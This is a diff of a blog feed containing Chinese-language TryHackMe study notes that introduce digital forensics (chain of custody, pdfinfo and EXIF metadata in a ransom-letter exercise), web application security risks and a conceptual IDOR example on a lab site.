+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">取证是将科学应用于调查犯罪并确定事实的过程。随着计算机和智能手机等数字系统的使用和普及，涉及数字设备和媒体的调查衍生出了一个新的取证领域：计算机取证，后来演变为数字取证。</span><br><span class="line"></span><br><span class="line">想象以下情景。执法人员到达犯罪现场；然而，这个犯罪现场的一部分包括数字设备和媒体。数字设备包括台式电脑、笔记本电脑、数码相机、音乐播放器和智能手机等。数字媒体包括CD、DVD、USB闪存驱动器和外部存储等。会出现一些问题：</span><br><span class="line"></span><br><span class="line">警方应如何收集数字证据，如智能手机和笔记本电脑？如果计算机和智能手机正在运行，应该遵循什么程序？</span><br><span class="line">如何转移数字证据？在搬运计算机时是否有一定的最佳实践要遵循？</span><br><span class="line">如何分析收集到的数字证据？个人设备存储容量从几十吉字节到数千吉字节不等；如何分析这些数据？</span><br><span class="line"></span><br><span class="line">假设上图中的员工存在嫌疑，我们可以迅速看到可能与调查相关的数字设备。我们注意到一个平板电脑、一个智能手机、一台数码相机和一个USB闪存驱动器，还有一台台式电脑。这些设备中的任何一个都可能包含大量的信息，有助于调查。处理这些作为证据需要进行数字取证。</span><br><span class="line"></span><br><span class="line">更正式地说，数字取证是将计算机科学应用于对数字证据进行法律目的调查的过程。数字取证用于两种类型的调查：</span><br><span class="line"></span><br><span class="line">公共部门调查是由政府和执法机构进行的调查。它们将成为刑事或民事调查的一部分。</span><br><span class="line">私营部门调查是由公司机构进行的调查，通过分配一个私人调查员，无论是内部还是外包。它们是由企业政策违规引发的。</span><br><span class="line">无论是调查犯罪还是企业政策违规，一部分证据与数字设备和数字媒体有关。这就是数字取证发挥作用并尝试确定发生了什么事情的地方。没有经过训练的数字取证调查员，将无法正确处理任何数字证据。</span><br></pre></td></tr></table></figure>
+<h4 id="Digital-Forensics-Process">Digital Forensics Process</h4>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">作为数字取证调查员，你到达了类似上图所示的现场。作为数字取证调查员，你应该做什么？在获得适当的法律授权后，基本计划如下：</span><br><span class="line"></span><br><span class="line">1. 获取证据：收集数字设备，如笔记本电脑、存储设备和数码相机。（需要注意的是，如果笔记本电脑和计算机正在运行，它们需要特殊处理；然而，这超出了本房间的范围。）</span><br><span class="line">2. 建立证据保管链：适当填写相关表格（样本表格）。目的是确保只有授权调查人员能够访问证据，没有人可以篡改它。</span><br><span class="line">3. 将证据放入安全容器：你要确保证据不会被损坏。对于智能手机，你要确保它们无法访问网络，以防止远程擦除。</span><br><span class="line">4. 将证据运输到你的数字取证实验室。</span><br><span class="line"></span><br><span class="line">在实验室里，流程如下：</span><br><span class="line"></span><br><span class="line">1. 从安全容器中取出数字证据。</span><br><span class="line">2. 创建证据的取证副本：取证副本需要使用高级软件来避免修改原始数据。</span><br><span class="line">3. 将数字证据放回安全容器：你将在副本上工作。如果你损坏了副本，你可以随时创建一个新的副本。</span><br><span class="line">4. 开始在你的取证工作站上处理副本。</span><br><span class="line"></span><br><span class="line">上述步骤已经改编自《计算机取证和调查指南》第6版。</span><br><span class="line"></span><br><span class="line">更普遍地说，根据前国防计算机取证实验室主任Ken Zatyko的说法，数字取证包括：</span><br><span class="line"></span><br><span class="line">1. 正确的搜索授权：调查人员不能在没有适当的法律授权的情况下开始工作。</span><br><span class="line">2. 证据保管链：这是必要的，以便随时了解谁持有证据。</span><br><span class="line">3. 使用数学验证：使用一种特殊类型的数学函数，称为哈希函数，我们可以确认文件没有被修改。</span><br><span class="line">4. 使用经过验证的工具：数字取证中使用的工具应该经过验证，以确保它们能正常工作。例如，如果你正在创建磁盘的映像，你希望确保取证映像与磁盘上的数据完全相同。</span><br><span class="line">5. 可重复性：只要具备适当的技能和工具，数字取证的发现就可以被复现。</span><br><span class="line">6. 报告：数字取证调查以一份报告结束，展示了与案件相关的发现的证据。</span><br></pre></td></tr></table></figure>
+<h4 id="Practical-Example-of-Digital-Forensics">Practical Example of Digital Forensics</h4>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">我们在数字设备上所做的一切，从智能手机到计算机，都会留下痕迹。让我们看看如何在后续的调查中利用这一点。</span><br><span class="line"></span><br><span class="line">我们的猫，Gado，被绑架了。绑匪给我们发送了一份请求的文档，格式为MS Word文档。我们已经将文档转换为PDF格式，并从MS Word文件中提取了图像以方便您查看。</span><br><span class="line"></span><br><span class="line">您可以下载附件到本地计算机进行检查；但是，为了您的方便，我们已将文件添加到AttackBox中。要跟随操作，请在AttackBox上打开终端，然后转到如下所示的目录。在以下终端输出中，我们更改了包含案例文件的目录。/root/Rooms/introdigitalforensics</span><br><span class="line"></span><br><span class="line">终端</span><br><span class="line">root# cd /root/Rooms</span><br><span class="line">root# cd introdigitalforensics</span><br><span class="line">root# ls</span><br><span class="line">letter-image.jpg  ransom-letter.doc  ransom-letter.pdf  ransom-lettter-2.zip</span><br><span class="line">文档元数据</span><br><span class="line">当您创建一个文本文件时，操作系统会保存一些元数据，例如文件创建日期和上次修改日期。但是，如果您使用更高级的编辑器，例如MS Word，则文件的元数据会保留许多信息。有各种方法可以读取文件元数据；您可以在官方的查看器/编辑器中打开它们，也可以使用适当的取证工具。请注意，将文件导出到其他格式（例如）将保留原始文档的大多数元数据，具体取决于所使用的PDF编写程序。TXTPDF</span><br><span class="line"></span><br><span class="line">让我们看看我们可以从PDF文件中了解到什么。我们可以尝试使用程序读取元数据。Pdfinfo显示与PDF文件相关的各种元数据，例如标题、主题、作者、创建者和创建日期。（AttackBox已经安装了；但是，如果您使用的是Kali Linux并且没有安装，请使用安装。）考虑以下使用的示例。.pdfinfopdfinfopdfinfosudo apt install poppler-utilspdfinfo DOCUMENT.pdf</span><br><span class="line"></span><br><span class="line">终端</span><br><span class="line">user@TryHackMe$ pdfinfo DOCUMENT.pdf </span><br><span class="line">创建者:        Microsoft® Word for Office 365</span><br><span class="line">生产者:       Microsoft® Word for Office 365</span><br><span class="line">创建日期:   Wed Oct 10 21:47:53 2018 EEST</span><br><span class="line">修改日期:        Wed Oct 10 21:47:53 2018 EEST</span><br><span class="line">标记:         yes</span><br><span class="line">用户属性: no</span><br><span class="line">嫌疑人:       no</span><br><span class="line">表单:           none</span><br><span class="line">JavaScript:     no</span><br><span class="line">页数:          20</span><br><span class="line">加密:      no</span><br><span class="line">页面大小:      595.32 x 841.92 pts (A4)</span><br><span class="line">页面旋转:       0</span><br><span class="line">文件大小:      560362 字节</span><br><span class="line">优化:      no</span><br><span class="line">PDF版本:    1.7</span><br><span class="line">PDF元数据清楚地显示了它是使用MS Word for Office 365于2018年10月10日创建的。</span><br><span class="line"></span><br><span class="line">照片EXIF数据</span><br><span class="line">EXIF代表可交换图像文件格式；这是一种将元数据保存到图像文件中的标准。每当您使用智能手机或数码相机拍照时，都会嵌入大量信息到图像中。以下是原始数字图像中可能包含的元数据示例：</span><br><span class="line"></span><br><span class="line">相机型号/智能手机型号</span><br><span class="line">图像捕获的日期和时间</span><br><span class="line">照片设置，例如焦距、光圈、快门速度和ISO设置</span><br><span class="line">由于智能手机配备有GPS传感器，因此在图像中找到嵌入的GPS坐标的可能性很高。 GPS坐标，即纬度和经度，通常会显示拍摄照片的地点。</span><br><span class="line"></span><br><span class="line">有许多在线和离线工具可用于读取图像的EXIF数据。其中一个命令行工具是。 ExifTool用于读取和写入各种文件类型的元数据，例如JPEG图像。（AttackBox已经安装了；但是，如果您使用的是Kali Linux并且没有安装，请</span><br><span class="line"></span><br><span class="line">使用安装。）在以下终端窗口中，我们执行了以读取此图像中嵌入的所有EXIF数据。exiftoolexiftoolexiftoolsudo apt install libimage-exiftool-perlexiftool IMAGE.jpg</span><br><span class="line"></span><br><span class="line">终端</span><br><span class="line">user@TryHackMe$ exiftool IMAGE.jpg</span><br><span class="line">[...]</span><br><span class="line">GPS位置: 51度31&#x27;4.00&quot; N，0度5&#x27;48.30&quot; W</span><br><span class="line">[...]</span><br><span class="line">如果您将上述坐标搜索到在线地图上，您将了解有关此位置的更多信息。在Microsoft Bing Maps或Google Maps中搜索，会发现这些坐标表明该图像是在伦敦博物馆附近拍摄的。 （我们只替换了以使我们的搜索起作用。）我们注意到坐标在搜索页面上被转换为十进制表示：.51° 31&#x27; 4.00&quot; N，0° 5&#x27; 48.30&quot; Wdeg°51.517776, -0.09675</span><br><span class="line"></span><br><span class="line">使用或任何类似的工具，尝试找出绑匪拍摄其附加到文档中的图像的地点。街道的名称是什么？exiftool</span><br></pre></td></tr></table></figure>
+<p>这边给了例题，主要就是查找基本的exif信息，除了上述给出的工具，直接用010手撸都行，最简单的misc</p>
+]]></content>
+      <categories>
+        <category>Tryhackme</category>
+      </categories>
+      <tags>
+        <tag>Tryhackme</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Tryhackme_Diary-1</title>
     <url>/2024/02/21/Tryhackme_Diary-1/</url>
     <content><![CDATA[<h1>Tryhackme_Diary-1</h1>
@@ -2236,37 +2267,6 @@ FFI是PHP中调用C代码的手段
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">您可能会看到渗透测试被称为渗透测试和道德黑客。渗透测试人员的工作职责是测试公司内部系统和软件的安全性 - 通过尝试通过系统化的黑客活动发现缺陷和漏洞来实现这一目标。渗透测试人员利用这些漏洞来评估每个实例中的风险。公司随后可以利用这些见解来纠正问题，以防止真实的网络攻击。</span><br><span class="line"></span><br><span class="line">责任</span><br><span class="line">对计算机系统、网络和基于Web的应用程序进行测试</span><br><span class="line">执行安全评估、审核和分析政策</span><br><span class="line">评估并报告见解，建议攻击预防措施</span><br><span class="line">学习路径</span><br><span class="line">TryHackMe的学习路径将为您提供基础的技术知识和实践经验，这对于成为一名成功的渗透测试人员至关重要。</span><br><span class="line"></span><br><span class="line">初级渗透测试员</span><br><span class="line">攻击性渗透测试</span><br></pre></td></tr></table></figure>
 <h4 id="Red-Teamer">Red Teamer</h4>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">红队员与渗透测试人员有相似之处，但职责更加具有针对性。渗透测试人员旨在发现系统中的许多漏洞，以保持网络防御的良好状态，而红队员则旨在测试公司的检测和响应能力。这项工作要求模仿网络犯罪分子的行动，模拟恶意攻击，保持访问权限，并避免被检测到。红队评估通常由公司外部的团队负责，可以持续长达一个月。它们通常最适合已建立成熟安全程序的组织。</span><br><span class="line"></span><br><span class="line">责任</span><br><span class="line">模拟威胁行为者的角色，发现可利用的漏洞，保持访问权限并避免被检测到</span><br><span class="line">评估组织的安全控制、威胁情报和事件响应程序</span><br><span class="line">评估并报告见解，提供可行的数据供公司避免真实世界中的情况</span><br><span class="line">学习路径</span><br><span class="line">TryHackMe的学习路径将为您提供基础的技术知识和实践经验，这对于成为一名成功的红队员至关重要。</span><br><span class="line"></span><br><span class="line">初级渗透测试员</span><br><span class="line">攻击性渗透测试</span><br><span class="line">红队员</span><br></pre></td></tr></table></figure>
-]]></content>
-      <categories>
-        <category>Tryhackme</category>
-      </categories>
-      <tags>
-        <tag>Tryhackme</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Tryhackme_Diary-2</title>
-    <url>/2024/02/22/Tryhackme_Diary-2/</url>
-    <content><![CDATA[<h1>Tryhackme_Diary-2</h1>
-<h2 id="Introduction-to-Offensive-Security">Introduction to Offensive Security</h2>
-<h3 id="Web-Application-Security">Web Application Security</h3>
-<h4 id="Introduction">Introduction</h4>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">每个人都在自己的计算机上使用不同的程序。一般来说，程序在我们的计算机上运行，利用我们计算机的处理能力和存储空间。而且，要使用一个程序，我们需要先安装它。但是如果我们可以在不安装的情况下使用任何程序呢？</span><br><span class="line"></span><br><span class="line">网络应用就像一个“程序”，只要我们有现代标准的网络浏览器，比如Firefox、Safari或Chrome，我们就可以使用它。因此，与其安装每个你需要的程序，你只需要浏览相关的页面。以下是一些网络应用的例子：</span><br><span class="line"></span><br><span class="line">- 网络邮件，比如Tutanota、Protonmail、Outlook和Gmail</span><br><span class="line">- 在线办公套件，如Microsoft Office 365（Word、Excel和PowerPoint）、Google Drive（Docs、Sheets和Slides）和Zoho Office（Writer、Sheet和Show）</span><br><span class="line">- 网上购物，如Amazon.com、AliExpress和Etsy</span><br><span class="line">成千上万的其他例子提供了各种各样的服务。其他例子包括在线银行业务、货币转账、天气预报和社交媒体。</span><br><span class="line"></span><br><span class="line">网络银行业务网络应用</span><br><span class="line"></span><br><span class="line">网络应用的概念是它是运行在远程服务器上的程序。服务器是指持续运行以“为客户服务”的计算机系统。在这种情况下，服务器将运行一种特定类型的程序，可以通过网络浏览器访问。</span><br><span class="line"></span><br><span class="line">考虑一个在线购物应用程序。网络应用程序将从数据库服务器读取有关产品及其详细信息的数据。数据库用于以有组织的方式存储信息。例如，关于产品、客户和发票的信息。数据库服务器负责许多功能，包括读取、搜索和写入数据库。在线购物网络应用可能需要访问一个以上的数据库，例如：</span><br><span class="line"></span><br><span class="line">- 产品数据库：这个数据库包含产品的详细信息，如名称、图片、规格和价格。</span><br><span class="line">- 客户数据库：它包含与客户相关的所有详细信息，如姓名、地址、电子邮件和电话号码。</span><br><span class="line">- 销售数据库：我们希望在这个数据库中看到每个客户购买了什么以及他们是如何支付的。</span><br><span class="line"></span><br><span class="line">我们已经看到了任何在线购物系统中存储的大量信息。假设攻击者成功地利用了网络应用程序并窃取了客户数据库，这将给公司和其客户带来重大损失。</span><br><span class="line"></span><br><span class="line">下面的图像显示了在在线购物网站上搜索商品的过程。在最简单的版本中，搜索将分为四个步骤：</span><br><span class="line"></span><br><span class="line">- 用户在搜索栏中输入商品名称或相关关键字。网络浏览器将搜索关键字发送到在线购物网络应用程序。</span><br><span class="line">- 网络应用程序查询（搜索）提交的关键字的产品数据库。</span><br><span class="line">- 产品数据库将匹配所提供的关键字的搜索结果返回给网络应用程序。</span><br><span class="line">- 网络应用程序将结果格式化为友好的网页并返回给用户。</span><br><span class="line"></span><br><span class="line">从用户的角度来看，他们只会访问一个优雅的在线商店，所有的技术基础设施都是隐藏的。</span><br><span class="line"></span><br><span class="line">访问网络应用程序时，技术基础设施被隐藏起来</span><br><span class="line"></span><br><span class="line">许多公司提供漏洞赏金计划。漏洞赏金计划允许公司为发现其系统中的安全漏洞（弱点）的任何人提供奖励。主要条件是找到的漏洞必须在漏洞赏金范围和规则内。谷歌、微软和Facebook等公司都有漏洞赏金计划。发现一个漏洞可以让你赚取从几百美元到数万美元不等的奖金，具体取决于漏洞的严重程度，也就是你发现的弱点。</span><br></pre></td></tr></table></figure>
-<h4 id="Web-Application-Security-Risks">Web Application Security Risks</h4>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">假设您想要从一个在线商店购买商品。在这个 Web 应用程序上，您期望能够执行一些特定的功能。最直接的情况下，在线订购可能会按照以下步骤进行：</span><br><span class="line"></span><br><span class="line">1. 在网站上登录。 2. 搜索产品。 3. 将产品添加到购物车中。 4. 指定送货地址。 5. 提供支付详情。</span><br><span class="line"></span><br><span class="line">针对 Web 应用程序的攻击主要有几个常见的类别。考虑以下步骤及相关的攻击。</span><br><span class="line"></span><br><span class="line">在网站上登录：攻击者可以尝试通过尝试许多密码来发现密码。攻击者会使用一个长列表的密码和自动化工具来测试它们与登录页面的匹配情况。</span><br><span class="line"></span><br><span class="line">搜索产品：攻击者可以尝试通过在搜索词中添加特定字符和代码来突破系统。攻击者的目标是使目标系统返回它不应该返回的数据或执行它不应该执行的程序。</span><br><span class="line"></span><br><span class="line">提供支付详情：攻击者会检查支付详情是否以明文形式发送或使用弱加密。加密是指使数据在不知道密钥或密码的情况下无法读取。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">我们无法涵盖所有内容，但我们将介绍 OWASP 十大的一些正式类别。如果这些技术对您来说听起来有些陌生，请不用担心；TryHackMe 将向您介绍每个漏洞。</span><br><span class="line"></span><br><span class="line">识别和身份验证失败：识别指的是唯一识别用户的能力。而身份验证则指的是证明用户是其所声称的人的能力。在线商店必须在用户使用系统之前确认用户的身份并对其进行身份验证。然而，这一步骤容易受到不同类型的弱点的影响。例如：</span><br><span class="line"></span><br><span class="line">允许攻击者使用暴力破解，即使用自动化工具尝试许多密码以查找有效的登录凭据。</span><br><span class="line"></span><br><span class="line">允许用户选择弱密码。弱密码通常容易被猜到。</span><br><span class="line"></span><br><span class="line">以明文形式存储用户的密码。如果攻击者成功读取包含密码的文件，我们不希望他们能够了解存储的密码。</span><br><span class="line"></span><br><span class="line">损坏的访问控制：访问控制确保每个用户只能访问与其角色或工作相关的文件（文档、图像等）。例如，您不希望市场部门的某人访问（阅读）财务部门的文档。与访问控制相关的示例漏洞包括：</span><br><span class="line"></span><br><span class="line">未能应用最小权限原则，并给予用户比他们需要的更多的访问权限。例如，一个在线客户应该能够查看商品的价格，但他们不应该能够更改商品价格。</span><br><span class="line"></span><br><span class="line">通过使用其唯一标识符查看或修改其他人的帐户。例如，您不希望一个银行客户能够查看另一个客户的交易。</span><br><span class="line"></span><br><span class="line">能够以未经身份验证的用户的身份浏览需要身份验证（登录）的页面。例如，我们不能让任何人在登录前查看网络邮件。</span><br><span class="line"></span><br><span class="line">注入：注入攻击是指 Web 应用程序中的漏洞，其中用户可以将恶意代码作为其输入的一部分插入。此漏洞的一个原因是对用户输入的验证和清理不足。</span><br><span class="line"></span><br><span class="line">密码学失败：这个类别与密码学有关的失败。密码学关注的是数据的加密和解密过程。加密将明文转换为密文，对于没有密钥解密的人来说，密文应该是无法理解的。换句话说，加密确保没有人能够在不知道密钥的情况下读取数据。解密使用密钥将密文转换回原始明文。密码学失败的</span><br><span class="line"></span><br><span class="line">示例包括：</span><br><span class="line"></span><br><span class="line">以明文形式发送敏感数据，例如使用 HTTP 而不是 HTTPS。HTTP 是访问 Web 的协议，而 HTTPS 是 HTTP 的安全版本。其他人可以读取您通过 HTTP 发送的所有内容，但不能读取 HTTPS。</span><br><span class="line"></span><br><span class="line">依赖弱密码算法。一个旧的密码算法是将每个字母向后移动一位。例如，“TRY HACK ME” 变成 “USZ IBDL NF”。这个密码算法很容易被破解。</span><br><span class="line"></span><br><span class="line">对密码学函数使用默认或弱密钥。使用 1234 作为密钥的加密很容易被破解。</span><br><span class="line"></span><br><span class="line">这张图显示了一名顾客在线使用她的信用卡，信用卡号以明文形式发送。</span><br><span class="line"></span><br><span class="line">如果这些技术起初看起来有些复杂或高级，请不用担心。TryHackMe 专门提供了深入的房间，帮助您理解和实验针对 Web 应用程序的各种攻击。</span><br></pre></td></tr></table></figure>
-<h4 id="Practical-Example-of-Web-Application-Security">Practical Example of Web Application Security</h4>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">此任务将调查一个使用不安全的直接对象引用（IDOR）的易受攻击的网站。IDOR属于破坏访问控制的范畴。破坏访问控制意味着攻击者可以访问未针对他们的信息或执行未经授权的操作。考虑这样一个情况，一个 Web 服务器接收用户提供的输入来检索对象（文件、数据、文档），并且它们按顺序编号。假设用户有权限访问名为 IMG_1003.JPG 的照片。我们可能会猜到还有 IMG_1002.JPG 和 IMG_1004.JPG; 但是，即使我们弄清了它的名称，Web 应用程序也不应该提供给我们那张照片。通常，如果对输入数据放置了太多的信任，就会出现IDOR漏洞。换句话说，Web 应用程序不会验证用户是否有权限访问请求的对象。</span><br><span class="line"></span><br><span class="line">仅仅提供用户或产品的正确 URL 并不一定意味着用户应该能够访问该 URL。例如，考虑产品页面 https://store.tryhackme.thm/products/product?id=52。我们可以期望这个 URL 提供有关产品编号 52 的详细信息。在数据库中，项目将按顺序分配编号。攻击者将尝试其他数字，例如 51 或 53，而不是 52; 如果 Web 应用程序容易受到攻击，这可能会显示其他已退休或未发布的产品。</span><br><span class="line"></span><br><span class="line">让我们考虑一个更为关键的例子；URL https://store.tryhackme.thm/customers/user?id=16 将返回 id=16 的用户。同样，我们期望用户具有顺序编号。攻击者将尝试其他数字，并可能访问其他用户帐户。这种漏洞可能适用于顺序文件；例如，如果攻击者看到 007.txt，那么攻击者可能会尝试其他数字，例如 001.txt、006.txt 和 008.txt。同样，如果您是编号为 16 的ID，而编号为 17 的ID是另一个用户，通过将ID更改为 17，您可以看到属于另一个用户的敏感数据。同样，他们可以将ID更改为 16，并查看属于您的敏感数据。（当然，我们在这里假设系统容易受到IDOR攻击。）</span><br><span class="line"></span><br><span class="line">点击“查看站点”，让我们看看它是如何运作的。您将看到一个显示库存管理系统的页面。如果您点击“计划发货”选项卡，您会发现攻击者已经在破坏计划中成功地混淆了事情。请注意，他们将错误的轮胎发送到每条生产线上；例如，他们将摩托车轮胎和摩托车轮胎分配给了自行车装配！如果不加修复，所有轮胎都将错误地发送到错误的装配线。</span><br><span class="line"></span><br><span class="line">我们将黑客系统并撤消攻击者的步骤。在“您的活动”中，您可以看到一个用户的活动。我们有理由相信这个网站有IDOR漏洞。</span><br></pre></td></tr></table></figure>
-<p>这一块就是介绍了一个简单的用户遍历，通过get请求可以直接通过相关编号修改去实现用户遍历，最后还原即得flag</p>
-<p><img src="https://s2.loli.net/2024/02/23/KQwURGOTarhvCYB.png" alt="Tryhackme_2_1"></p>
-<h2 id="Introduction-to-Defensive-Security">Introduction to Defensive Security</h2>
-<h3 id="Intro-to-Digital-Forensics">Intro to Digital Forensics</h3>
-<h4 id="Introduction-To-Digital-Forensics">Introduction To Digital Forensics</h4>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">取证是将科学应用于调查犯罪并确定事实的过程。随着计算机和智能手机等数字系统的使用和普及，涉及数字设备和媒体的调查衍生出了一个新的取证领域：计算机取证，后来演变为数字取证。</span><br><span class="line"></span><br><span class="line">想象以下情景。执法人员到达犯罪现场；然而，这个犯罪现场的一部分包括数字设备和媒体。数字设备包括台式电脑、笔记本电脑、数码相机、音乐播放器和智能手机等。数字媒体包括CD、DVD、USB闪存驱动器和外部存储等。会出现一些问题：</span><br><span class="line"></span><br><span class="line">警方应如何收集数字证据，如智能手机和笔记本电脑？如果计算机和智能手机正在运行，应该遵循什么程序？</span><br><span class="line">如何转移数字证据？在搬运计算机时是否有一定的最佳实践要遵循？</span><br><span class="line">如何分析收集到的数字证据？个人设备存储容量从几十吉字节到数千吉字节不等；如何分析这些数据？</span><br><span class="line"></span><br><span class="line">假设上图中的员工存在嫌疑，我们可以迅速看到可能与调查相关的数字设备。我们注意到一个平板电脑、一个智能手机、一台数码相机和一个USB闪存驱动器，还有一台台式电脑。这些设备中的任何一个都可能包含大量的信息，有助于调查。处理这些作为证据需要进行数字取证。</span><br><span class="line"></span><br><span class="line">更正式地说，数字取证是将计算机科学应用于对数字证据进行法律目的调查的过程。数字取证用于两种类型的调查：</span><br><span class="line"></span><br><span class="line">公共部门调查是由政府和执法机构进行的调查。它们将成为刑事或民事调查的一部分。</span><br><span class="line">私营部门调查是由公司机构进行的调查，通过分配一个私人调查员，无论是内部还是外包。它们是由企业政策违规引发的。</span><br><span class="line">无论是调查犯罪还是企业政策违规，一部分证据与数字设备和数字媒体有关。这就是数字取证发挥作用并尝试确定发生了什么事情的地方。没有经过训练的数字取证调查员，将无法正确处理任何数字证据。</span><br></pre></td></tr></table></figure>
-<h4 id="Digital-Forensics-Process">Digital Forensics Process</h4>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">作为数字取证调查员，你到达了类似上图所示的现场。作为数字取证调查员，你应该做什么？在获得适当的法律授权后，基本计划如下：</span><br><span class="line"></span><br><span class="line">1. 获取证据：收集数字设备，如笔记本电脑、存储设备和数码相机。（需要注意的是，如果笔记本电脑和计算机正在运行，它们需要特殊处理；然而，这超出了本房间的范围。）</span><br><span class="line">2. 建立证据保管链：适当填写相关表格（样本表格）。目的是确保只有授权调查人员能够访问证据，没有人可以篡改它。</span><br><span class="line">3. 将证据放入安全容器：你要确保证据不会被损坏。对于智能手机，你要确保它们无法访问网络，以防止远程擦除。</span><br><span class="line">4. 将证据运输到你的数字取证实验室。</span><br><span class="line"></span><br><span class="line">在实验室里，流程如下：</span><br><span class="line"></span><br><span class="line">1. 从安全容器中取出数字证据。</span><br><span class="line">2. 创建证据的取证副本：取证副本需要使用高级软件来避免修改原始数据。</span><br><span class="line">3. 将数字证据放回安全容器：你将在副本上工作。如果你损坏了副本，你可以随时创建一个新的副本。</span><br><span class="line">4. 开始在你的取证工作站上处理副本。</span><br><span class="line"></span><br><span class="line">上述步骤已经改编自《计算机取证和调查指南》第6版。</span><br><span class="line"></span><br><span class="line">更普遍地说，根据前国防计算机取证实验室主任Ken Zatyko的说法，数字取证包括：</span><br><span class="line"></span><br><span class="line">1. 正确的搜索授权：调查人员不能在没有适当的法律授权的情况下开始工作。</span><br><span class="line">2. 证据保管链：这是必要的，以便随时了解谁持有证据。</span><br><span class="line">3. 使用数学验证：使用一种特殊类型的数学函数，称为哈希函数，我们可以确认文件没有被修改。</span><br><span class="line">4. 使用经过验证的工具：数字取证中使用的工具应该经过验证，以确保它们能正常工作。例如，如果你正在创建磁盘的映像，你希望确保取证映像与磁盘上的数据完全相同。</span><br><span class="line">5. 可重复性：只要具备适当的技能和工具，数字取证的发现就可以被复现。</span><br><span class="line">6. 报告：数字取证调查以一份报告结束，展示了与案件相关的发现的证据。</span><br></pre></td></tr></table></figure>
-<h4 id="Practical-Example-of-Digital-Forensics">Practical Example of Digital Forensics</h4>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">我们在数字设备上所做的一切，从智能手机到计算机，都会留下痕迹。让我们看看如何在后续的调查中利用这一点。</span><br><span class="line"></span><br><span class="line">我们的猫，Gado，被绑架了。绑匪给我们发送了一份请求的文档，格式为MS Word文档。我们已经将文档转换为PDF格式，并从MS Word文件中提取了图像以方便您查看。</span><br><span class="line"></span><br><span class="line">您可以下载附件到本地计算机进行检查；但是，为了您的方便，我们已将文件添加到AttackBox中。要跟随操作，请在AttackBox上打开终端，然后转到如下所示的目录。在以下终端输出中，我们更改了包含案例文件的目录。/root/Rooms/introdigitalforensics</span><br><span class="line"></span><br><span class="line">终端</span><br><span class="line">root# cd /root/Rooms</span><br><span class="line">root# cd introdigitalforensics</span><br><span class="line">root# ls</span><br><span class="line">letter-image.jpg  ransom-letter.doc  ransom-letter.pdf  ransom-lettter-2.zip</span><br><span class="line">文档元数据</span><br><span class="line">当您创建一个文本文件时，操作系统会保存一些元数据，例如文件创建日期和上次修改日期。但是，如果您使用更高级的编辑器，例如MS Word，则文件的元数据会保留许多信息。有各种方法可以读取文件元数据；您可以在官方的查看器/编辑器中打开它们，也可以使用适当的取证工具。请注意，将文件导出到其他格式（例如）将保留原始文档的大多数元数据，具体取决于所使用的PDF编写程序。TXTPDF</span><br><span class="line"></span><br><span class="line">让我们看看我们可以从PDF文件中了解到什么。我们可以尝试使用程序读取元数据。Pdfinfo显示与PDF文件相关的各种元数据，例如标题、主题、作者、创建者和创建日期。（AttackBox已经安装了；但是，如果您使用的是Kali Linux并且没有安装，请使用安装。）考虑以下使用的示例。.pdfinfopdfinfopdfinfosudo apt install poppler-utilspdfinfo DOCUMENT.pdf</span><br><span class="line"></span><br><span class="line">终端</span><br><span class="line">user@TryHackMe$ pdfinfo DOCUMENT.pdf </span><br><span class="line">创建者:        Microsoft® Word for Office 365</span><br><span class="line">生产者:       Microsoft® Word for Office 365</span><br><span class="line">创建日期:   Wed Oct 10 21:47:53 2018 EEST</span><br><span class="line">修改日期:        Wed Oct 10 21:47:53 2018 EEST</span><br><span class="line">标记:         yes</span><br><span class="line">用户属性: no</span><br><span class="line">嫌疑人:       no</span><br><span class="line">表单:           none</span><br><span class="line">JavaScript:     no</span><br><span class="line">页数:          20</span><br><span class="line">加密:      no</span><br><span class="line">页面大小:      595.32 x 841.92 pts (A4)</span><br><span class="line">页面旋转:       0</span><br><span class="line">文件大小:      560362 字节</span><br><span class="line">优化:      no</span><br><span class="line">PDF版本:    1.7</span><br><span class="line">PDF元数据清楚地显示了它是使用MS Word for Office 365于2018年10月10日创建的。</span><br><span class="line"></span><br><span class="line">照片EXIF数据</span><br><span class="line">EXIF代表可交换图像文件格式；这是一种将元数据保存到图像文件中的标准。每当您使用智能手机或数码相机拍照时，都会嵌入大量信息到图像中。以下是原始数字图像中可能包含的元数据示例：</span><br><span class="line"></span><br><span class="line">相机型号/智能手机型号</span><br><span class="line">图像捕获的日期和时间</span><br><span class="line">照片设置，例如焦距、光圈、快门速度和ISO设置</span><br><span class="line">由于智能手机配备有GPS传感器，因此在图像中找到嵌入的GPS坐标的可能性很高。 GPS坐标，即纬度和经度，通常会显示拍摄照片的地点。</span><br><span class="line"></span><br><span class="line">有许多在线和离线工具可用于读取图像的EXIF数据。其中一个命令行工具是。 ExifTool用于读取和写入各种文件类型的元数据，例如JPEG图像。（AttackBox已经安装了；但是，如果您使用的是Kali Linux并且没有安装，请</span><br><span class="line"></span><br><span class="line">使用安装。）在以下终端窗口中，我们执行了以读取此图像中嵌入的所有EXIF数据。exiftoolexiftoolexiftoolsudo apt install libimage-exiftool-perlexiftool IMAGE.jpg</span><br><span class="line"></span><br><span class="line">终端</span><br><span class="line">user@TryHackMe$ exiftool IMAGE.jpg</span><br><span class="line">[...]</span><br><span class="line">GPS位置: 51度31&#x27;4.00&quot; N，0度5&#x27;48.30&quot; W</span><br><span class="line">[...]</span><br><span class="line">如果您将上述坐标搜索到在线地图上，您将了解有关此位置的更多信息。在Microsoft Bing Maps或Google Maps中搜索，会发现这些坐标表明该图像是在伦敦博物馆附近拍摄的。 （我们只替换了以使我们的搜索起作用。）我们注意到坐标在搜索页面上被转换为十进制表示：.51° 31&#x27; 4.00&quot; N，0° 5&#x27; 48.30&quot; Wdeg°51.517776, -0.09675</span><br><span class="line"></span><br><span 